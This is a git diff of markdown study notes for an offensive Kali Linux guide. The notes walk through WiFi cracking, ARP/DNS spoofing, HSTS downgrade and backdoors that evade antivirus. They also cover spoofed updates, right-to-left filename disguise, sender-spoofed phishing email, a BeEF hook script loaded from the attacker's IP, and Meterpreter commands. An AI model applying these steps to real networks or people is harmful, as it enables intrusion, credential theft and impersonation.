@@ -1,6 +1,6 @@
 # Kali-Linux-Offensive-Guide
 
-##MAC address
+## MAC address
 - Media Access Control
 - unique for network device (wired or Ethernet card etc.)
 - always the same for a device
@@ -9,29 +9,29 @@
 - every packet has source and destination MAC address
 - because all packets sent in the air, it is possible to capture packets even if we do not have the destination MAC
 
-##ifconfig
+## ifconfig
 - shows all devices that can connect to the network
 - only connected devices have IP address
 
-###ifconfig <network-interface> down/up
+### ifconfig <network-interface> down/up
 - disables/enables the network device
 
-###ifconfig <network-interface> <attribute> <value>
+### ifconfig <network-interface> <attribute> <value>
 - changes the given attribute of the network to value
 - for MAC address, attribute = *hw ether* and set first two characters as *00*
 
-##iwconfig
+## iwconfig
 - shows all wireless interfaces
 - change the *Mode* of the interface to *Monitor* to see all packets in the area of this wireless
 
-###iwconfig <wireless-interface> <attribute> <value>
+### iwconfig <wireless-interface> <attribute> <value>
 - for monitor mode, attribute = *mode* and value = *monitor*
 
-##airmon-ng check kill
+## airmon-ng check kill
 - kills any process that can interfere with wireless interface
 - cuts the connection to internet
 
-##airodump-ng <wireless-interface>
+## airodump-ng <wireless-interface>
 - in monitor mode, shows info about wireless networks around
 - only shows 2.4 Ghz networks
 - BSSID : MAC address
@@ -46,15 +46,15 @@
 - AUTH : authentication used on the network
 - ESSID : name of the network
 
-###--band
+### --band
 - specifies bands for the networks searched
 - *a* : 5 Ghz networks
 - *abg* : both 2.4 and 5 Ghz networks
 
-###--bssid
+### --bssid
 - sniffs data from only specified network by MAC address
 
-###--channel
+### --channel
 - give also channel number while sniffing data from specific network
 
 - by giving these 2 as argument, clients connected to the wireless network can be seen
@@ -62,22 +62,22 @@
 - Frames : captured packets
 - Probe : if the device is still probing for network
 
-###--write
+### --write
 - writes the sniffed data to the file
 - appends *-01-* automatically
 - use *.cap* in general
 - the file contains all the data sent to and from the target network but they are encrypted by the router encryption
 
-##WIFI Bands
+## WIFI Bands
 - the frequency range that network can use to broadcast the signal
 - most common : 2.4 Ghz and 5 Ghz
 
-##wireshark
+## wireshark
 - program to open *.cap* files
 - enlists all the data packets sniffed
 - *Source* section shows the manufacturer of the device with the MAC address
 
-##aireplay-ng --deauth <number> -a <router-MAC> -c <device-MAC> <wireless-interface>
+## aireplay-ng --deauth <number> -a <router-MAC> -c <device-MAC> <wireless-interface>
 - deauthentication attack
 - disconnects the client with MAC address *device-MAC* from the network with MAC address *router-MAC*
 - sends deauthenticaton packets to the both router and device
@@ -86,7 +86,7 @@
 - use this while running *airodump-ng* to get better results
 - <number> specifies how many deauth packets will be send so it will determine the disconnection time
 
-##WEP Encryption
+## WEP Encryption
 - stands for Wired Equivalent Privacy
 - older from orther router encryptions and not safe
 - uses the algorithm RC4
@@ -112,7 +112,7 @@ only communicates with connected clients)
 - lastly, crack the key like it is a busy network
 - while cracking, *airodump-ng* and *aireplay-ng* can still run
 
-##aircrack-ng <cap-file>
+## aircrack-ng <cap-file>
 - cracks the WEP encrypted router key
 - first write the captured data packets to a file by using *airodump-ng*
 - then give the *.cap* file as an argument to this command
@@ -120,7 +120,7 @@ only communicates with connected clients)
 - if there is no ASCI section, take the hex number with semicolons; it is the hex of the key
 - remove semicolons and use the rest number as key
 
-##aireplay-ng --fakeauth 0 -a <router-MAC> -h <adapter-MAC> <wireless-interface>
+## aireplay-ng --fakeauth 0 -a <router-MAC> -h <adapter-MAC> <wireless-interface>
 - fake authentication attack, associates with the network
 - to find adapter MAC, use *ifconfig* and the MAC is the first 12 characters of the *unspec* field
 - replace *-* with *:*
@@ -128,12 +128,12 @@ only communicates with connected clients)
 - when activated, the wireless adapter should appear in *airodump-ng* because it is associated and can communicate with the network
 - *AUTH* field also can be *OPN*
 
-##aireplay-ng --arpreplay -b <router-MAC> -h <adapter-MAC> <wireless-interface>
+## aireplay-ng --arpreplay -b <router-MAC> -h <adapter-MAC> <wireless-interface>
 - ARP replay attack (forcing to generate packets)
 - similar procedures with the fake authentication attack
 - enough to get around 45k packets
 
-##WPA and WPA2 Encryption
+## WPA and WPA2 Encryption
 - WPA uses *TKIP* and WPA2 uses *CCMP* encryption algorithms
 - both of them are cracked in the same way
 - *WPS* allows devices to connect the router without the key (for printer etc.)
@@ -167,7 +167,7 @@ again
 - use *aircrack-ng* like below
 - to speed up the process, run the attack on GPU instead of CPU if possible or pipe the result of *crunch* to *aircrack-ng*
 
-##wash --interface <wireless-interface>
+## wash --interface <wireless-interface>
 - lists all networks with WPS enabled
 - adapter should be in monitor mode
 - keeps running until you cancel it
@@ -177,14 +177,14 @@ again
 - *dBm* : signal strength
 - *Ch* : channel
 
-##reaver --bssid <router-MAC> --channel <ch> --interface <wireless-interface> -vvv --no-associate
+## reaver --bssid <router-MAC> --channel <ch> --interface <wireless-interface> -vvv --no-associate
 - WPS pin attack
 - download the older version if it does not work
 - *-vvv* shows more info
 - *--no-associate* tells reaver to not associate because we will do it manually, it has higher chance to fail when done automatically
 - shows the cracked pin and network key when the process is done
 
-##crunch <min> <max> <characters> -t <pattern> -o <file>
+## crunch <min> <max> <characters> -t <pattern> -o <file>
 - wordlist generation
 - min and max specifies min and max number of characters in the password
 - characters specifies which characters are used in the password
@@ -193,7 +193,7 @@ again
 - the generated passwords are written in the file
 - there are much more options, use man to see them (-p is important)
 
-##aircrack-ng <cap-file> -w <wordlist-file>
+## aircrack-ng <cap-file> -w <wordlist-file>
 - wordlist attack
 - use the *.cap* file generated from *airodump-ng*
 - tests all passwords in the wordlist file one by one to find the correct one
@@ -201,23 +201,23 @@ again
 - because the speed of this attack really depends on the processor and the wordlist size, search the internet sites where they have
 huge wordlists and super computers so that by uploading the handshake packet file, it finds the true password faster
 
-##IP Address
+## IP Address
 - stands for *Internet Protocol*
 - the IP address of the network device can be found by using *ifconfig* like below
 - the IP address of the router is the first address in the subnet
 - if the device has IP : 192.168.0.25, the router should have 192.168.0.1
 
-##ifconfig <wireless-interface>
+## ifconfig <wireless-interface>
 - IP address is the field *inet addr*
 
-##Information Gathering in Network
+## Information Gathering in Network
 - use *NetDiscover* to map the network we connected to
 - you can only gather info from the devices that connected to the same network with you
 - use *NMap* to get much much more information, it is a huge tool
 - it can show the running programs on a computer or the operating system
 - *Zenmap* is a program to utilize Nmap terminal command in a graphical interface
 
-##netdiscover -r <ip-range>
+## netdiscover -r <ip-range>
 - gathering information about the network
 - ip range should start with the router ip (X.X.X.1)
 - the range from 1 to 254 can be specified by X.X.X.1/24
@@ -225,7 +225,7 @@ huge wordlists and super computers so that by uploading the handshake packet fil
 - if done via the wireless adapter, the wired connection to the virtual machine must be disabled
 - devices > network > connect network adapter uncheck
 
-##Zenmap
+## Zenmap
 - call by typing zenmap in the terminal
 - into the target box, give an IP or a range of IPS
 - *Ping scan* : very fast, just shows which IP addresses are used in the network by the devices and the manufacturer with MAC addresses
@@ -234,7 +234,7 @@ huge wordlists and super computers so that by uploading the handshake packet fil
 - Services section shows which devices use which service
 - ports are so important because we decide how to hack the device by looking at their open ports
 
-##MITM Attacks
+## MITM Attacks
 - Man in the Middle Attacks
 - they are the attacks that can be launched when we intercept the communication between devices
 - *ARP Spoofing* : the hacker gets himself in the connection path of two devices, so the packets are sent to hacker and from there,
@@ -280,17 +280,17 @@ in HTTP from it anymore
 - see *hstshijack* module below to get to know some options
 - HSTS can not be bypassed if the target HSTS website is loaded from another HSTS website(Google), so the solution is partial
 
-##HTTP, HTTPS and HSTS
+## HTTP, HTTPS and HSTS
 - stands for *Hypertext Transfer Protocol*, *Hypertext Transfer Protocol Secure* and *HTTP Strict Transport Security*
 - in HSTS, for example, change *facebook.com* to *facebook.corn* xd or *twitter.com* to *twiter.com* xd
 - in order this HSTS attack to work, the target website should not be loaded from a HSTS websites
 - for example, the target should not load facebook from google, so bypassing HSTS is a partial solution
 
-##arp -a
+## arp -a
 - shows the ARP table recorded in the computer
 
-##arpspoof -i <network-interface> -t <target-IP> <router-IP>
-##arpspoof -i <network-interface> -t <router-IP> <target-IP>
+## arpspoof -i <network-interface> -t <target-IP> <router-IP>
+## arpspoof -i <network-interface> -t <router-IP> <target-IP>
 - allows you to intercept the connection between target and the router
 - all packets between them will flow through us
 - first one tells the target that we are the router
@@ -298,10 +298,10 @@ in HTTP from it anymore
 - so the target changes the MAC address of the router to our MAC address
 - similar for router
 
-##echo 1 > /proc/sys/net/ipv4/ip_forward
+## echo 1 > /proc/sys/net/ipv4/ip_forward
 - enables port forwarding
 
-##bettercap -iface <network-interface> (optional) -caplet <.cap>
+## bettercap -iface <network-interface> (optional) -caplet <.cap>
 - starts the bettercap command prompt
 - type *help* to see the modules
 - type *help <module-name>* to get information about the module
@@ -317,40 +317,40 @@ in HTTP from it anymore
 - to run a caplet in the bettercap terminal, directly type its name
 - wildcards in the terminal can be used in bettercap, especially *
 
-###<module-name> on
+### <module-name> on
 - starts the specific module
 - only after setting all the parameters of the module, run this to start the attack
 
-###set <module.parameter> <value>
+### set <module.parameter> <value>
 - sets the attribute of the module to the value
 - for example, *set arp.spoof.fullduplex true*
 
-###net.probe on
+### net.probe on
 - shows the clients connected to same network
 - it automatically starts the module *net.recon* because this module sends probe request to all IPs and if they respond they all are taken
 to a list by net.recon
 
-###net.show
+### net.show
 - when net.probe is already on, the discovered clients are shown in a table giving basic information about them like *airodump-ng*
 - *gateway* speicifes the router
 - *<network-interface>* specifies this computer
 
-###arp.spoof
+### arp.spoof
 - arp spoofing with bettercap
 - *arp.ban on* : cuts the connection of the target
 - make sure *net.probe* and *net.recon* is running before starting this module
 - after turning on this module, in the target machine, the MAC address of both the router and our computer should be the same and be equal
 to the MAC address of our computer (check with ifconfig)
 
-####fullduplex
+#### fullduplex
 - both the target and the router are attacked and we become man in the middle
 - default will only attack the target, so set the router also by using *arp.spoof.fullduplex true*
 
-####targets
+#### targets
 - default is entire subnet
 - give the IP address of the target
 
-###net.sniff
+### net.sniff
 - sniffs datas flowing through our computer when we are man in the middle, captures them and we can analyze it
 - can be run without setting any parameter if HTTPS websites are not cared
 - maybe can not capture datas in websites using *https*
@@ -359,22 +359,22 @@ to the MAC address of our computer (check with ifconfig)
 - by default, it will only capture datas in HTTP because those datas are sent as plain text so they are not secure
 - to also capture datas in HTTPS, run the caplet *hstshijack/hstshijack* after turning on this module
 
-###caplets.show
+### caplets.show
 - shows all the *.cap* files in the system
 - we should be able to locate *hstshijack* caplet here to downgrade HTTPS to HTTP
 
-###hstshijack
+### hstshijack
 - downgrades HTTPS to HTTP and transforms website links with HSTS to similar websites
 - *facebook.com* -> *facebook.corn*
 
-####targets
+#### targets
 - target websites using HSTS
 
-####replacements
+#### replacements
 - replace the targets with these ones
 - write the replacements in the order of the targets
 
-##DNS Spoofing
+## DNS Spoofing
 - it is a server that converts domain names(google.com) to the IP of the server hosting this website
 - notice that there is no *www* at the start of the domain name
 - when an url given to a web browser, the request goes to a DNS server and it responds with the IP of that url
@@ -387,32 +387,32 @@ we want so we can load any website, inject evil, hijack updates etc.
 - the attack will work in 1-2 minute
 - this attack will not work on websites using HSTS
 
-###dns.spoof
+### dns.spoof
 - replies the DNS messages with spoofed responses
 - set *all* to true
 - set *address* and *domains* and then turn on the module
 
-####address
+#### address
 - IP address that we return to the target computer
 - the default is the IP address of our current running network interface
 - so do not modify it if you want to locate to our IP address
 
-####all
+#### all
 - makes the module reply to every DNS request sent
 
-####domains
+#### domains
 - the domain names of the websites(facebook.com) to be redirected to the IP we give
 - seperate websites with commas
 - give the target url but also the subdomain containing it (\*.facebook.com)
 
-##Website from our web server
+## Website from our web server
 - Kali comes with a built in web server
 - type *service apache2 start* to run it
 - now it acts as a normal website which can be reached when the IP address of our computer is given to web browser as url
 - the files uploaded to this website can be found in */var/www/html*
 - *index.html* is the loaded by default as gui
 
-##Injecting Javascript code
+## Injecting Javascript code
 - because the data flows through our computer when we are man in the middle, if th router has responded with a webpage with HTML and Javascript
 code, we can change it or add to it our own code
 - HTML code only organizes buttons, tables or similar things in user interface
@@ -426,7 +426,7 @@ code, we can change it or add to it our own code
 - preparation is now complete, just do the same procedure now with the data sniffing and hstshajicak folder
 - launch *bettercap* with the interface and the *arpspoof.cap* file and then run *hstshijack/hstshijack* in it
 
-##Wireshark
+## Wireshark
 - network protocol analyzer
 - shows what is happening and which user is doing what in the network
 - loads all the flowing data packets and allows to filter them
@@ -457,7 +457,7 @@ devices
 - then you can anaylze it after with opening in wireshark from File section
 - you can use *Ctrl+f* to search packets or information in the packets, select it on the left from the search bar
 
-###Capturing usernames and passwords
+### Capturing usernames and passwords
 - login forms are sent in *POST* packets, so to capture a packet doing logins, look for POST packets
 - then double click the POST packet to see the website the login form is sent
 - the username and password can be found in the *HTML Form URL Encoded* section
@@ -465,7 +465,7 @@ devices
 - chances of finding username and password is higher in packets with info *POST /users/login...*
 - seeing the username and passwords in wireshark is easier and sometimes bettercap can not show them directly, it can fail to filter them
 
-##Fake Access Point
+## Fake Access Point
 - another method of becoming man in the middle
 - we use our computer to create a wifi network that has internet access
 - people come and try to access our network to connect to the internet
@@ -473,19 +473,19 @@ devices
 - we need a network interface to connect to the internet and a wireless adapter that is cspsblr of broadcasting the wifi signal
 - our computer will be seen like a normal network
 
-##Mana-toolkit
+## Mana-toolkit
 - runs rouge access point attacks
 - automatically configures and creates fake access point, sniffs data, bypasses HTTPS etc.
 - before starting the kit, first configure its settings stored in the file */etc/mana-toolkit/hostapd-mana.conf*
 
-###start-noupstream.sh
+### start-noupstream.sh
 - starts fake AP without internet access
 
-###start-nat-simple.sh
+### start-nat-simple.sh
 - starts fake AP with internet access
 - use this then run bettercap to sniff data and bypass HTTPS yourself
 
-###start-nat-full.sh
+### start-nat-full.sh
 - starts fake AP with internet access and sniffs data, bypasses HTTPS
 - fails a lot so do not prefer this
 
@@ -493,7 +493,7 @@ devices
 - we use *wlan0*(wireless adapter) interface to broadcast signal but adapter should be in *managed* mode and shoudl not be connectod to the
 internet
 
-##Detecting ARP Spoofing attack
+## Detecting ARP Spoofing attack
 - if we write *arp -a* to list all the devices in the network, we can see all the MAC addresses associated with IP addresses
 - if there is a MAC address corresponding with more than one IP address, including router, then we are ARP spoofed gg eazy
 - the attacker's MAC and IP can be easily determined because that MAC and the IP that is not belonging to router are the attacker's addresses
@@ -507,7 +507,7 @@ MAC address
 broadcast packets asking "who has this IP, my MAC is this"
 - the person with that MAC address is probably doing an ARP spoof attack
 
-##Preventing MITM attacks
+## Preventing MITM attacks
 - can use this methods when we understand we are being attacked or we connect to a network that we have no control(public networks like eduroam)
 - the key to solution is encryptting our traffic so that even if somebody intercepts it, that person can not read them
 - the solution involves using HTTPS everywhere plugin or using a VPN
@@ -516,7 +516,7 @@ broadcast packets asking "who has this IP, my MAC is this"
 - but this method does not work for websites using HTTP and even if hacker can not access our usernames and password, he can still see which
 websites we are accessing by ARP spoofing attack and can still run a DNS spoofing attack
 
-##VPN
+## VPN
 - stands for *Virtual Private Network*
 - the complete solution to prevent MITM attacks is using a VPN, most of them uses the same technology so the provider does not matter
 - VPN establihes an encrypted tunnel between our computer and the VPN server we connect
@@ -544,23 +544,23 @@ expensive and costly
 decrypts it but because of HTTPS, the server still can not read your data, it can just send it to the website and send you the encrypted response
 - this way, your data will always be encrypted until it reaches the target(website), it does not matter how many times it is encrypted
 
-##Gaining Access to Computers
+## Gaining Access to Computers
 - EVERY ELECTRONIC DEVICE AROUND IS A COMPUTER, some of them are just simpler
 - even webservers and websites can be thought as a computer
 - so penetration on every device uses the same methods
 - Two main sides to attack them : Server side and Client side
 
-###Server Side attacks
+### Server Side attacks
 - we do not need user to do anything
 - getting the target IP address is enough
 - mostly work on webservers and devices that user does not interfere with the system, devices that runs automatically after configured
 - we use the operating system and applications running on the system to gain access to that computer
 
-###Client Side attacks
+### Client Side attacks
 - requires user interaction(updating an app, installing an image, opening a link etc.)
 - information gathering is crucial here because we use social engineering to make the target run the trap
 
-##Server Side
+## Server Side
 - we need an IP address
 - can be run against normal computers also but is generally run against servers because we rely on IP address
 - if the target is not connected to the same network with us, then the target is hiding behind the router so if we try to gather information,
@@ -570,13 +570,13 @@ most of the data we get is about the router, not the computer
 - if the target is a domain, then a single ping will return its IP address
 - use *ping* like below to check if the communication between us and the target is fine
 
-##ping <IP-address> or <domain-name>
+## ping <IP-address> or <domain-name>
 - sends to and gets packets from the computer with the given IP
 - if a domain name is given, we can get the IP address by using this command
 - used to check if the communication between us and the target is okay
 - if it is working fine, then we can be sure that the server side attacks will work
 
-###Information Gathering
+### Information Gathering
 - we get information about what operating system is running, which programs are currently open and which ports are available
 - once we get access to these services, we try default passwords of the system to get full access
 - services may be misconfigured so they can be exploited
@@ -586,14 +586,14 @@ most of the data we get is about the router, not the computer
 - intense scan can show all the installed applications on the device
 - we can even give the IP address of a website or webserver to zenmap it will show the running activities if we have the permission
 
-###Exploitation
+### Exploitation
 - when we find the open ports with intense scan, we should now check ports one by one to see whether it has a misconfiguration or backdoor in them
 - to do this, just google the *service* and *version* of the port and learn how to get through them, there is no general way of doing this
 - all programs seen in open ports are hacked differently so we should make research about this
 - zenmap also shows some vulnerabilities if it can finds, so read the informations below the open ports
 - especially look for default passwords, misconfigurations, backdoors, code execution vulnerabilities like buffe overflow
 
-####Metasploit
+#### Metasploit
 - an execution development and execution tool
 - can also be used for penetration tests
 - contains huge number of exploits, additionally you can create your own exploits
@@ -612,31 +612,31 @@ most of the data we get is about the router, not the computer
 disable our firewall to let the target connect
 - when we select payload, *set PAYLOAD <payload-name>*
 
-#####msfconsole
+##### msfconsole
 - launches the Metasploit
 
-#####help
+##### help
 
-#####show <something>
+##### show <something>
 - shows available exploits, payloads, auxiliaries or options
 - *show options* is useful
 - *show targets* is also critical because you must choose a target from there before running exploit
 - *show payloads*
 
-#####use <something>
+##### use <something>
 - when the available exploits or others are shown, use them with this command
 
-#####set <option> <value>
+##### set <option> <value>
 - sets the option of a module to the given value
 - the option is the name of the option when the options are listed with *show options*
 - *set TARGET <target-id>* to set the target, do not forget this
 - *set PAYLOAD <payload-name>* to select which payload to inser
 - *set PAYLOAD <payload-name>* to select which payload to insert
 
-#####exploit
+##### exploit
 - runs the exploit with the configurations made earlier
 
-####Nexpose
+#### Nexpose
 - it is a vulnerability management framework
 - allows us to discover, assess and act on discovered vulnerabilities
 - also tells us wheter the discovered vulnerability is exploitable or not
@@ -647,17 +647,17 @@ disable our firewall to let the target connect
 - run it by executing the *nsc.sh* file in */opt/rapid7/nexpose/nsc*
 - to log in nexpose, find the section with *https://localhost* and go there from the web browser
 
-##Client Side
+## Client Side
 - use when server side attacks fail(can not ping the target because he is hiding behind a router, not in the same network etc)
 - requires the target to do something(open a link or a file, install an update etc)
 - so therefore information gathering is much more important in this case
 - we do not only learn the target computer's os or applicarions but also try to get some information about the person(friends, websites they use)
 
-##Backdoor
+## Backdoor
 - is a file that gives us full control over the machine that it gets executed on
 - backdoors can be caught by antivrus programs, so our goal is to generate backdoor that are undetectable by antivirus programs
 
-###Veil
+### Veil
 - a framework to generate undetectable backdoors
 - it automatically lists available commands to us
 - update is important because we bypass antiviruses and they also get updated
@@ -677,15 +677,15 @@ connection to our computer, it will be seen like a normal interaction
 - in the attacks, set the *LHOST* to our IP, *LPORT* to 80 or 8080, 80 may be used by another server, so 8080 is preferable
 - by setting these, we bypass all antiviruses except *AVG*
 
-####use
+#### use
 - allows us to select the tool, payload, in general the helper we want to achieve our goal
 - so after listing the avaiable options, *use <id>* to select the specific one and then veil lists the new available commands that can be used now
 
-####set
+#### set
 - sets the required options that is listed
 - use like *set LHOST <ip>*
 
-##Antivirus programs
+## Antivirus programs
 - they have very large database of signatures that corresponds to files that contain harmful codes
 - so they compare the signature of our file to the all files in the database
 - if there is a match, then the program flags our file as virus or malware
@@ -703,7 +703,7 @@ effective in future
 - antivirus programs update their databases so same payload might get detected in the future, so update veil regularly and always check the scan
 results in nodistribute.com
 
-##Listening to Incoming Connections
+## Listening to Incoming Connections
 - by setting payload to reverse, the target is connecting to our computer
 - for this to work, we need to open a port in our computer
 - we set our port to 8080, so we should open port with number 8080
@@ -718,7 +718,7 @@ allow us to hack
 - do not forget to start the webserver of kali by typing *service apache2 start*
 - in the target machine, go to our IP address in web brower and to go to our directory, just type *<IP>/<folder*>
 
-##Spoofing Software Updates
+## Spoofing Software Updates
 - a backdoor delivery method which a program says an update is available, and when the user allows the update, it will actually downloads and runs
 the backdoor
 - the only limitation of this method is that we need to be the man in the middle, no matter how
@@ -731,7 +731,7 @@ the backdoor
 - also while being the man in the middle, we need to run a DNS spoofing attack to redirect the target to our trap
 - do not forget to listen to incoming connections to gain access when the backdoor is executed
 
-###evilgrade
+### evilgrade
 - fakes the user by pretending there is an app update
 - very similar program to Metasploit
 - use the module *dap* to fake Win10 update
@@ -742,24 +742,24 @@ the backdoor
 appearing in the options as *VirtualHost*
 - then, we need to listen to incoming connections using Metasploit to prepare ourselves for backdoor executing 
 
-####show modules
+#### show modules
 - shows all programs that we can hijack their updates
 
-####configure <module-name>
+#### configure <module-name>
 - sets the used module to module name
 
-####show options
+#### show options
 - shows the options that can be set in the module
 - the option *agent* is the backdoor file to be used, set it
 - the *endsite* option is the website that is to be loaded when the update is successful
 
-####set <option-name> <value>
+#### set <option-name> <value>
 - set the option to a specific value, just like in Metasploit
 
-####start
+#### start
 - runs the fake update, waiting for the user to request the update and it will serve the prepared fake one
 
-##Backdooring exe Downloads
+## Backdooring exe Downloads
 - we wait for the target to download an executable and we backdoor as it is being downloaded
 - when that executable is run, the target gets the file he is expecting but at the same time, we get the full access on the computer
 - again, we need to be the man in the middle to carry out this attack
@@ -773,10 +773,10 @@ appearing in the options as *VirtualHost*
 - then get into it by typing *sessions -i <session-id>*
 - now we gained access successfully
 
-###iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+### iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 - directs the exe downloads from bettercap to bdfproxy
 
-##Preventing Client Side attacks
+## Preventing Client Side attacks
 - make sure to not to be targeted by man in the middle attack
 - protecting us from it is explained earlier
 - download only from HTTPS pages, it is enough the website to be HTTPS, the download link should also be encrypted with it
@@ -784,7 +784,7 @@ appearing in the options as *VirtualHost*
 - if the file is configured on the way, like inserting a backdoor, then it will change the MD5 hash of it
 - compare the hash created with winmd5 with the hash provided in the website where we downloaded the file
 
-##Social Engineering
+## Social Engineering
 - earlier client side attacks needed user interaction but did not ask user to do anything
 - but to run them we needed to become the man in the middle
 - next attacks do not require us to be the man in the middle
@@ -793,7 +793,7 @@ appearing in the options as *VirtualHost*
 - then the strategy will depend on that informations
 - we can pretend to be a friend of the target to ask for running a specific file with backdoor
 
-##Maltego
+## Maltego
 - an information gathering tool about anything(people, websites, computers, companies, phone numbers etc)
 - critical for information gathering
 - password is 15
@@ -809,7 +809,7 @@ appearing in the options as *VirtualHost*
 - it generally asks for hint strings to look for, if you know nothing, just put a space there
 - double click entitites to inspect them better
 
-##Combining the backdoor with any file
+## Combining the backdoor with any file
 - not only depend on the exe files, generate a generic solution
 - when the target runs the downloaded file with any extension, our backdoor will also run in the background
 - in the script *autoit-download-and-execute.txt*, we see urls section
@@ -827,7 +827,7 @@ appearing in the options as *VirtualHost*
 - there is a problem which is that when the target downloads the file, the file looks like an image and acts like an image while working but its
 extension is *.exe*
 
-##Changing the Extension of the .exe File
+## Changing the Extension of the .exe File
 - to hide our backdoor further, we must change the extension of our file to the type that is compatible with the file from *.exe*
 - to do this, we use a method named *right to left override character*
 - this makes the file name is read from right to left after a specific character is seen, even if the last part is actually *.exe*
@@ -845,7 +845,7 @@ name part
 the extension
 - then put this zip file into our website folder, */var/www/html/<folder>*
 
-##Fake Email Delivery
+## Fake Email Delivery
 - you can send fake emails that looks like it is sent from any address
 - in the mail, pretend to be a friend, company, website and ask the target to do something
 - you can fake an update, send a backdoored image, ask to visit a webpage, literally anything
@@ -862,44 +862,44 @@ send emails, so these mails will not labeled as spam
 - go to *transactional* section to see the settings for the server provided by the website, they are used to authenticate to SMTP servers
 - then we use *sendemail* program in Kali to send fake emails using these informations provided
 
-##sendemail
+## sendemail
 - tool to send fake emails by using the information provided by the SMTP server provider, *sendinblue.com*
 - use the *-xu, -xp and -s* options the authenticate, to login to the server to send an email
 - the rest of them configures the details of the email
 - use all of them in one long command
 - this method of sending fake email and backdooring works as long as the backdoor works in the target operating system
 
-###-xu <address>
+### -xu <address>
 - specifies the username for the STMP server
 
-###-xp <password>
+### -xp <password>
 - specifies the password for the STMP server
 
-###-s <server>:<port>
+### -s <server>:<port>
 - specifies the server and the port used
 
-###-f
+### -f
 - the sender address
 - we fake here
 - make sure it is a real email to be not suspected
 
-###-t
+### -t
 - the receiver addresses
 
-###-u
+### -u
 - the title of the email
 
-###-m
+### -m
 - the message body of the email
 - to send the backdoored file we create, first upload it to a webserver(for example, Dropbox)
 - then share the link of it, but change the last number in the url from *0* to *1*
 - this change makes the browser automatically download the file
 
-###-o message-header=<header>
+### -o message-header=<header>
 - the message header where the sender's name is shown
 - set the header following exactly this setting "From: <name-showing-in-the-inbox> <<fake-sender-mail>>
 
-##Using a Web Hosting
+## Using a Web Hosting
 - paid services are again better because most used ones by people are now blacklisted so they are marked as spam automatically or may even not
 deliver it
 - *000webhost.com* is a good website providing it
@@ -908,7 +908,7 @@ deliver it
 - we are going to upload something to do website to choose to upload files
 - in the website, *public_html* contains the files that are loaded by default when it is opened
 
-##BEEF
+## BEEF
 - *Browser Exploitation Framework*
 - allows to launch attacks on a hooked target
 - targets are said to be hooked when they load a hook url
@@ -940,7 +940,7 @@ get the target to open a specific web page
 - also, now in hook file, use the public ip, the above html code of the script should be changed to
 *<script src="http://<public-ip>:3000/hook.js"></script>*
 
-###Hooking when we are MITM
+### Hooking when we are MITM
 - earlier, we were able to inject javascript codes to websites loaded by the target
 - using the same method, now inject the hook javascript file to every page loaded
 - this way, when the target uses the web browser, the hook is applied immediately
@@ -951,7 +951,7 @@ get the target to open a specific web page
 - then use bettercap to catch all the datas going to and from the target computer with *bettercap -iface <interface> -caplet <.cap>*
 - in the bettercap, activate hstshijack with *hstshijack/hstshijack* to inject the code
 
-###Using Commands on the Browser
+### Using Commands on the Browser
 - just use user interface to find the suitable command and then execute from the bottom right
 - for example, search for alert in the commands and use *create alert dialog* to make the website alert some message
 - *raw javascript* lets us execute a javascript code directly on that browser
@@ -961,7 +961,7 @@ get the target to open a specific web page
 - *pretty theft* pops up a fake login prompt for the selected social media account saying the session is expired and when the target enters
 username and password, it directly comes to us
 
-###Opening a Meterpreter Session
+### Opening a Meterpreter Session
 - again in the commands section, select the *fake notification bar <target's browser>* attack
 - it will tell the target that there is an update and ask to install it, but it will actually contain backdoor in it
 - you can use the same backdoor you were using opening a meterpreter session
@@ -971,7 +971,7 @@ username and password, it directly comes to us
 - set a suitable notification test to fool the target
 - do not forget to listen to incoming connections with metasploit
 
-##Detecting Files with Backdoors
+## Detecting Files with Backdoors
 - analyzing trojans
 - check the properties of the downloaded file
 - if it shows *.exe* where it should have been an pdf or jpg, then it is suspicious
@@ -985,13 +985,13 @@ username and password, it directly comes to us
 - use *reverse dns lookup* from the internet which shows the corresponding target from a given ip address
 - so if the given ip is dangerous, we could catch it by using this service
 
-###Using a Sandbox
+### Using a Sandbox
 - an online sandbox service executes the given file and analyzes it
 - looks if any ports are opened, any suspicious thing is modified etc
 - it is a controlled environment so the service gives report of any changes
 - *www.hybrid-analysis.com* is a good website for this job
 
-##Attacking Outside the Network
+## Attacking Outside the Network
 - to make the backdoors, beef work for the targets outside the network, we must configure our router to handle reverse connections properly and
 direct these connections to our computer
 - as known previously, the devices in the network communicate with the internet through the router, requests and responses are sent to the router
@@ -1010,18 +1010,18 @@ it is actually the router making the requests in the internet, not our computer
 our computer on the specific ports
 - learn the public ip of the router by googling "whats my ip"
 
-###Generating and Sending Backdoor
+### Generating and Sending Backdoor
 - it is the same as before when we generate for local ip, except we now set the LHOST to our public ip
 - use payload 9 in veil, *cs/meterpreter/rev_http.py*
 - listen to incoming connections on your local ip, because you have control only on your computer, it is not possible to listen to connections on
 the router
 - then set up ip forwarding to tell that for example, when a connection comes to port 8080, forward it to our compute
 
-##route -n
+## route -n
 - shows the router local ip
 - check it from here if it is not the first ip in the subnet
 
-##Configuring the Router to Forward Connections
+## Configuring the Router to Forward Connections
 - go to the router domain in the web browser
 - domain is the roouter local ip
 - log in with username and password
@@ -1034,65 +1034,65 @@ the router
 - after this adjustment, to access our local domain outside the netwowrk, go to the public ip domain
 - the router will forward it to our local domain and others can access the backdoors in there
 
-##Meterpreter
+## Meterpreter
 - after opening a session by a backdoor and listening the connection, we can use a lot of commands
 - run *sessions -l* in the metasploit to see the current open sessions
 - to go into a session, run *sessions -i <session-id>*
 
-###help
+### help
 - lists all commands that can be used
 
-###background
+### background
 - ctrl+c in the terminal
 - throws the current session to the background, allowing us to interact with metasploit for further exploitations
 
-###sysinfo
+### sysinfo
 - shows information about the target hacked computer
 
-###ipconfig
+### ipconfig
 - just like ipconfig in windows
 - shows all the interfaces in the target computer
 
-###ps
+### ps
 - shows all the processes running on the target computer
 
-###migrate <process-id>
+### migrate <process-id>
 - changes the root of our session seen by resource monitor or task manager
 - *explorer.exe* is a very safe choice for this job because we know it will be always open as long as windows runs
 - so our interactions from port 8080 or whatever it is will appear as if it is done by the process *explorer.exe*
 
-###pwd
+### pwd
 
-###ls
+### ls
 
-###cd
+### cd
 
-###cat
+### cat
 
-###download <file>
+### download <file>
 - downloads the file from target computer to ours
 
-###upload <file>
+### upload <file>
 - uploads the file from our computer to the target one
 
-###execute -f <file>
+### execute -f <file>
 - executes the file on the target computer
 - the file must be in the target computer, not ours
 
-###shell
+### shell
 - converts the meterpreter interface to the target operating system's shell interface
 - so we can easily use windows shell to speed up our work
 
